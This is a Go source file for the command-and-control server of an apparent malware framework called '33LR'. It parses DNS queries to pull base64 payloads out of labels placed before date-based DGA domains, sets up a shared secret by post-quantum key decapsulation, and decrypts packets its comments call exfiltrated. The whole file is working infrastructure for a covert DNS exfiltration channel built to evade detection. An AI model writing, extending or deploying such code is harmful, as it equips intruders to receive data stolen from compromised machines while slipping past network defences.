package c2

import (
	"encoding/base64"
	"fmt"
	"strings"
	"33lr-framework/pkg/crypto"
)

// C2Server represents the 33LR Command & Control node.
type C2Server struct {
	SharedSecrets map[string][]byte // Maps SessionID/KeyID to shared secret
	PrivateKey    []byte
}

// NewC2Server initializes a new C2 server with its post-quantum private key.
func NewC2Server(privKey []byte) *C2Server {
	return &C2Server{
		SharedSecrets: make(map[string][]byte),
		PrivateKey:    privKey,
	}
}

// ListenAndProcess simulates the reception of a DNS query and processes its payload.
func (s *C2Server) ListenAndProcess(query string) ([]byte, error) {
	// 1. Extract payload from query (everything before the DGA domain)
	parts := strings.Split(query, ".")
	if len(parts) < 3 {
		return nil, fmt.Errorf("invalid query format")
	}
	
	// Reconstruct the encoded payload (joining the first labels)
	// Example: <label1>.<label2>.<dga-domain>
	encodedPayload := ""
	for i := 0; i < len(parts)-2; i++ {
		// Stop if we hit the date part of the DGA domain (e.g., 20260529)
		if len(parts[i]) == 8 && strings.HasPrefix(parts[i], "202") {
			break
		}
		encodedPayload += parts[i]
	}

	// 2. Decode from Base64
	data, err := base64.RawURLEncoding.DecodeString(encodedPayload)
	if err != nil {
		return nil, fmt.Errorf("decoding failed: %v", err)
	}

	return data, nil
}

// ProcessInitialKEM handles the first packet (Ciphertext) to establish the shared secret.
func (s *C2Server) ProcessInitialKEM(ct []byte) ([]byte, error) {
	ss, err := crypto.Decapsulate(s.PrivateKey, ct)
	if err != nil {
		return nil, err
	}
	return ss, nil
}

// ProcessPolymorphicMessage decrypts an incoming exfiltrated packet.
func (s *C2Server) ProcessPolymorphicMessage(data []byte, sharedSecret []byte) (string, error) {
	if len(data) < 16 {
		return "", fmt.Errorf("packet too short")
	}

	salt := data[:16]
	payload := data[16:]

	decrypted, err := crypto.Decrypt33LR(payload, salt, sharedSecret)
	if err != nil {
		return "", err
	}

	return string(decrypted), nil
}
